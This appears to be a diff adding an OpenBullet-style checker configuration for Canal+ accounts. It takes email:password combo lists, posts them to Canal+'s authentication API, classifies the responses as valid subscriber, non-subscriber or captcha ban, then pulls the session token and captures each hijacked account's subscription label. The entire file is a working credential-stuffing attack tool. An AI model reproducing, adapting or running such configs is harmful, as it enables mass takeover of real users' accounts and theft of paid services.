@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "API myCANAL",
+  "SuggestedBots": 100,
+  "LastModified": "2018-12-08T06:32:23.007401+00:00",
+  "AdditionalInfo": "",
+  "Author": "Slyn",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 14280182
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 1724351380
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 968995987
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 483765694
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST POST "https://pass-api-v2.canal-plus.com/mobile/authentication?ssoconf=auth_win8&media=WIN8&vect=Internet&version=10.33&type=other&omnitureChannel=myCWindows&distributorId=S13665&portailId=OQaRQJQkSdM." AutoRedirect=FALSE 
+  CONTENT "error=invalidCredentials&ssoEmail=<USER>&ssoPass=<PASS>&submitButton=Se+connecter" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "'non identifie';" 
+    KEY "4=\"non abonne\"," 
+  KEYCHAIN Success OR 
+    KEY "4=\"abonne\"," 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<HEADERS(*)>" Contains "https://pass-api-v2.canal-plus.com/mobile/updatePassword" 
+  KEYCHAIN Ban OR 
+    KEY "<p id=\"recaptchaMsg\">" 
+#PARSE_Token PARSE "<SOURCE>" LR "passToken\":\"" "\",\"errorMessage\":\"\",\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Red_EspClient REQUEST GET "https://api-client.canal-plus.com/self/persons/current/subscriptions" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "PASSTOKEN: <TOKEN>" 
+#Abonnement PARSE "<SOURCE>" LR "label\":\"" "\",\"commercialLabel" Recursive=TRUE -> CAP "Abonnement" "" "" 
